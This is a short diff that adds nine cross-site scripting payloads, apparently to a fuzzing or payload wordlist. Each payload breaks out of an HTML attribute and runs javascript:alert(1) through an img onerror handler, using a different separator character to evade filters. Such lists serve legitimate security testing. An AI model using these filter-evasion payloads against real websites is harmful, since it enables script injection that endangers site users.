@@ -1,0 +1,9 @@
+"/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />
+"/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />
+"/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />
+"/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />
+"/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />
+"/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />
+"/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />
+"/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />
+"/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />
